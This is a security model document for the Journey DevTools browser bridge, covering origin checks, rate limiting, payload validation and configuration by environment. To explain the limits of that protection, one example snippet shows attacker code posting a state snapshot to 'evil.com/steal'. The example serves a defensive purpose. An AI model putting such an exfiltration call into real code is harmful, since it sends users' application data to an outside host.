# Security Model

## Overview

The Journey DevTools bridge follows the **same security architecture as React DevTools, Redux DevTools, and Vue DevTools**. It provides origin isolation and developer workflow safety, but does not (and cannot) protect against malicious code running in the same page context.

## What is Protected

### ✅ Origin Isolation

Commands from `evil.com` cannot control machines on `yourapp.com`. The bridge validates that messages originate from the expected window origin.

```typescript
// Only messages from the same origin are processed
if (event.source !== window || !isExpectedWindowOrigin(event.origin)) {
  return;
}
```

### ✅ Cross-Tab Protection

Tab A cannot send commands to machines in Tab B. Each tab has its own isolated message channel.

### ✅ Rate Limiting

Built-in rate limiter prevents command abuse (100 commands per 10-second window).

```typescript
// Prevents rapid-fire command attacks
if (!rateLimiter.isAllowed()) {
  return error("Command rate limit exceeded");
}
```

### ✅ Deep Payload Validation

All commands and payloads are validated before execution:

- Maximum nesting depth (10 levels)
- Maximum payload size (500KB)
- Prototype pollution defense
- Circular reference rejection
- Type and format validation

### ✅ Developer Workflow Safety

- Commands disabled by default in production (`NODE_ENV=production`)
- Optional command toggling via `commandsEnabled` flag
- Clear error messages for debugging
- No token/session-based command auth API is part of the current public bridge surface

## What is NOT Protected

### ❌ Malicious Code in Your Application

**If an attacker can run JavaScript in your page context, they already have direct access to everything:**

```javascript
// Attacker doesn't need the devtools bridge - they have the machine!
const machine = window.__myMachine__;
machine.send({ type: "admin_action" });
machine.reset();
// Or just steal data directly
fetch("https://evil.com/steal", {
  method: "POST",
  body: JSON.stringify(machine.getSnapshot())
});
```

The devtools bridge uses `window.postMessage` for extension ↔ page communication (like React/Redux/Vue DevTools). This means page scripts can see messages, but **this doesn't matter** because malicious code already has direct access to your machine instances.

### ❌ XSS Vulnerabilities

If your application has XSS vulnerabilities, fix them at the application layer. The devtools bridge cannot protect against XSS - no devtools can.

### ❌ Physical Access to Debug Sessions

If someone has physical access to a machine with devtools open, they can send commands. This is true for all browser devtools.

## Comparison with Other DevTools

| Feature                   | Journey DevTools | React DevTools | Redux DevTools | Vue DevTools |
| ------------------------- | ---------------- | -------------- | -------------- | ------------ |
| Origin Isolation          | ✅               | ✅             | ✅             | ✅           |
| Rate Limiting             | ✅               | ❌             | ❌             | ❌           |
| Payload Validation        | ✅ (Deep)        | ✅ (Basic)     | ✅ (Basic)     | ✅ (Basic)   |
| Production Default        | Disabled         | Enabled        | Enabled        | Enabled      |
| Same-Page Code Protection | ❌               | ❌             | ❌             | ❌           |

## Best Practices

### For Production

```typescript
// Disable entirely in production
attachJourneyDevtools(machine, {
  enabled: process.env.NODE_ENV !== "production"
});
```

### For Development

```typescript
// Enable with commands
attachJourneyDevtools(machine, {
  enabled: true,
  commandsEnabled: true
});
```

### For Staging/QA

```typescript
// Enable read-only mode
attachJourneyDevtools(machine, {
  enabled: true,
  commandsEnabled: false // Can view state, but not send commands
});
```

## Real Security Measures

To secure your application:

1. **Fix XSS vulnerabilities** - Sanitize user input, use Content Security Policy
2. **Validate state transitions** - Implement guards in your machine definition
3. **Server-side validation** - Never trust client state for critical operations
4. **Disable in production** - Keep devtools disabled for public users
5. **Use HTTPS** - Prevent man-in-the-middle attacks
6. **Audit dependencies** - Run `npm audit` regularly

## Architecture

```text
DevTools Panel (Extension)
    ↓
Background Script (Extension)
    ↓
Content Script (Extension) - Injects into page
    ↓
window.postMessage - Visible to all same-origin scripts
    ↓
Bridge (Page Context) - Validates origin, rate limits, deep validation
    ↓
Machine (Page Context) - Already accessible to all page scripts
```

**Key Point**: The `window.postMessage` boundary is visible to all scripts in the page context. This is by design and matches how all major browser devtools work. The security comes from origin validation, not message hiding.
